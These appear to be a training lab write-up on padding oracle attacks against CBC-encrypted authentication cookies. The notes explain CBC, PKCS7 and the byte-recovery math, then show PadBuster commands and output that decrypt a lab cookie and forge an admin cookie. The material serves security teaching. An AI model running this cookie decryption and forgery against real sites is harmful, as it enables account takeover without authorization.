

# Padding Oracle

## This exercise covers an attack against CBC mode. This attack can be used to decrypt data and re-encrypt arbitrary data


## Introduction

* This course details the exploitation of a weakness in the authentication of a PHP website. 

* The website uses Cipher Block Chaining (CBC) to encrypt information provided by users and use this information to ensure authentication.

* The application also leaks if the padding is valid when decrypting the information. We will see how this behavior can impact the authentication and how it can be exploited.

### Cipher Block Chaining

* CBC is an encryption mode in which the message is split into blocks of `X` bytes length and each block is XORed with the previous encrypted block. The result is then encrypted.

* The following schema (source: [Wikipedia](http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)) explains this method:

![10_03_CBC_encryption.png](https://github.com/tejeshreddymeka/PentesterLabNotes/blob/master/images/10_03_CBC_encryption.png)

	
* During the decryption, the reverse operation is used. The encrypted data is split in block of `X` bytes. Then the block is decrypted and XORed with the previous encrypted block to get the cleartext. The following schema (source: [Wikipedia](http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)) highlights this behavior:

![10_03_CBC_decryption.png](https://github.com/tejeshreddymeka/PentesterLabNotes/blob/master/images/10_03_CBC_decryption.png)

* Since the first block does not have a previous block, an initialization vector (IV) is used.

## Padding

* As we saw, the encryption is done by blocks of fixed size. To ensure that the cleartext exactly fit in one or multiple blocks, padding is often used. Padding can be done in multiple ways. 

* A common way is to use `PKCS7`. With `PKCS7`, the padding will be composed of the same number: the number of bytes missing. For example, if the cleartext is missing 2 bytes, the padding will be `\x02\x02`.

* Let's look at more examples with a 2 blocks:

![10_03_blocks.PNG](https://github.com/tejeshreddymeka/PentesterLabNotes/blob/master/images/10_03_blocks.PNG)

* If the length of the original data is an integer multiple of the block size `B`, then an extra block of bytes with value `B` is added. 

* This is necessary so the deciphering algorithm can determine with certainty whether the last byte of the last block is a pad byte indicating the number of padding bytes added or part of the plaintext message. 

* Consider a plaintext message that is an integer multiple of `B` bytes with the last byte of plaintext being `01`. With no additional information, the deciphering algorithm will not be able to determine whether the last byte is a plaintext byte or a pad byte. 

* However, by adding `B` bytes each of value `B` after the `01` plaintext byte, the deciphering algorithm can always treat the last byte as a pad byte and strip the appropriate number of pad bytes off the end of the ciphertext; said number of bytes to be stripped based on the value of the last byte.

## Padding Oracle

* When an application decrypts encrypted data, it will first decrypt the data; then it will remove the padding. During the cleanup of the padding, if an invalid padding triggers a detectable behavior, you have a padding oracle. The detectable behavior can be an error, a lack of results, or a slower response.

* If you can detect this behavior, you can decrypt the encrypted data and even re-encrypt the cleartext of your choice.

## The theory

* If we zoom in, we can see that the cleartext byte `C15` is just a XOR between the encrypted byte `E7` from the previous block, and byte `I15` which came out of the block decryption step:

![10_03_zoomin.png](https://github.com/tejeshreddymeka/PentesterLabNotes/blob/master/images/10_03_zoomin.png)

* This is also valid for all other bytes:
```
C14 = I14 ^ E6
C13 = I13 ^ E5
C12 = I12 ^ E4
...
```
* Now if we modify `E7` and keep changing its value, we will keep getting an invalid padding. Since we need `C15` to be `\x01`. However, there is one value of `E7` that will give us a valid padding. Let's call it `E'7`. With `E'7`, we get a valid padding. And since we know we get a valid padding we know that `C'15` (as in `C15` for `E'7`) is `\x01`.

	* `\x01 = I15 ^ E'7`

* The gives us:

	* `I15 = \x01 ^ E'7`

* So we are able to compute I15.

* Since we know `I15`, we can now compute `C15`

	* `C15 = E7 ^ I15 = E7 ^ \x01 ^ E'7`

* Now that we have `C15`, we can move to brute-forcing `C14`. First we need to compute another `E7` (let's call it `E''7`) that gives us `C15 = \x02`. We need to do that since we want the padding to be `\x02\x02` now. It's really simple to compute using the property above and by replacing the value of `C15` we want (`\x02`) and `I15` we now know:

	* `E''7 = \x02 ^ I15`

* After brute force E6, to find the value that gives us a valid padding `E''6`, we can re-use the formula:

	* `C14 = I14 ^ E6`

* to get

	* `I14 = \x02 ^ E''6`

* Once we get `I14`, we can compute `C14`:

	* `C14 = E6 ^ I14 = E6 ^ \x02 ^ E''6`

* Using this method, we can keep going until we get all the ciphertext decrypted.

* Detection of the vulnerability
To get started, you can register an account and log in with this account (to make things easier, you get automatically logged in when you register).

* If you create an account and log in two times with this account, you can see that the cookie sent by the application didn't change.

* If you log in many times and always get the same cookie, there is probably something wrong in the application. The cookie sent back should be unique each time you log in. If the cookie is always the same, it will probably always be valid and there won't be anyway to invalidate it.
Now, if you try to modify the cookie, you can see that you get an error from the application.

## Exploitation using [PadBuster](https://github.com/AonCyberLabs/PadBuster)

* By using PadBuster, you can exploit this issue in a matter of seconds. To do so, you will need to follow the following steps using PadBuster:

	* Decrypt the cookie.

	* Generate a new cookie to become admin.

	* Manual exploitation

* To ensure you get a good understanding of this attack, it's strongly recommended that you write your own tool.

* To do, it's recommended to work locally. For example, the following code can be used to create a padding oracle in Ruby:
```ruby
def right_padding?(data)
  cipher = OpenSSL::Cipher::Cipher.new('des-cbc')
  cipher.decrypt
  cipher.key = â€œtesttest"
  cipher.iv = "12345678"
  begin
    cipher.update(data)+cipher.final
    return true
  rescue Exception => e
    return false
  end
end
```
* Conclusion

* This exercise showed you how you can tamper encrypted information without decrypting them and use this behavior to gain access to other accounts. It showed you that encryption can not be used as a replacement to signature and how it's possible to use a padding oracle to decrypt and re-encrypt information.


* You can access this exercise using the following URL: http://ptl-ed527008-41d36aa8.libcurl.so/

``bash
$ cpan -i LWP::UserAgent    # I don't know whether it requires
$ sudo apt-get install -y libwww-perl
$ sudo apt-get install -y libcrypt-ssleay-perl
```

```bash
$ ./padBuster.pl http://ptl-5be18b0e-c6c886cb.libcurl.so/ u7bvLewln6PJ670Gnj3hnE40L0SqG8e6 8 -error "Invalid padding" -cookie "auth=u7bvLewln6PJ670Gnj3hnE40L0SqG8e6"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1273

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

[+] Success: (47/256) [Byte 8]
[+] Success: (8/256) [Byte 7]
[+] Success: (174/256) [Byte 6]
[+] Success: (43/256) [Byte 5]
[+] Success: (166/256) [Byte 4]
[+] Success: (116/256) [Byte 3]
[+] Success: (62/256) [Byte 2]
[+] Success: (58/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): c9ebbd069e3de19c
[+] Intermediate Bytes (HEX): cec58a5fd151fad0
[+] Plain Text: user=tes

Use of uninitialized value $plainTextBytes in concatenation (.) or string at ./padBuster.pl line 361.
*** Starting Block 2 of 2 ***

[+] Success: (102/256) [Byte 8]
[+] Success: (28/256) [Byte 7]
[+] Success: (199/256) [Byte 6]
[+] Success: (99/256) [Byte 5]
[+] Success: (252/256) [Byte 4]
[+] Success: (68/256) [Byte 3]
[+] Success: (21/256) [Byte 2]
[+] Success: (75/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 4e342f44aa1bc7ba
[+] Intermediate Bytes (HEX): bdecba01993ae69b
[+] Plain Text: t

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=test

[+] Decrypted value (HEX): 757365723D7465737407070707070707

[+] Decrypted value (Base64): dXNlcj10ZXN0BwcHBwcHBw==

-------------------------------------------------------
```
* We now know the format of plaintext `user=test`

```bash
$ ./padBuster.pl http://ptl-5be18b0e-c6c886cb.libcurl.so/ u7bvLewln6PJ670Gnj3hnE40L0SqG8e6 8 -error "Invalid padding" -cookie "auth=u7bvLewln6PJ670Gnj3hnE40L0SqG8e6" -plaintext "user=admin"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1273

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

[+] Success: (230/256) [Byte 8]
[+] Success: (82/256) [Byte 7]
[+] Success: (50/256) [Byte 6]
[+] Success: (184/256) [Byte 5]
[+] Success: (68/256) [Byte 4]
[+] Success: (53/256) [Byte 3]
[+] Success: (206/256) [Byte 2]
[+] Success: (244/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 6d5bcbbf4acbaa1d
[+] Intermediate Bytes (HEX): 0435cdb94ccdac1b

[+] Success: (200/256) [Byte 8]
[+] Success: (115/256) [Byte 7]
[+] Success: (232/256) [Byte 6]
[+] Success: (220/256) [Byte 5]
[+] Success: (51/256) [Byte 4]
[+] Success: (3/256) [Byte 3]
[+] Success: (72/256) [Byte 2]
[+] Success: (61/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): becc9eba1d7aeb54
[+] Intermediate Bytes (HEX): cbbffbc8201b8f39

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: vsyeuh1661RtW8u%2FSsuqHQAAAAAAAAAA
-------------------------------------------------------
```

* Set `vsyeuh1661RtW8u%2FSsuqHQAAAAAAAAAA` as cookie and request the page with which you will get the key as `6d2deda8-6fcb-48e4-9ab3-cd4b169eb65`.
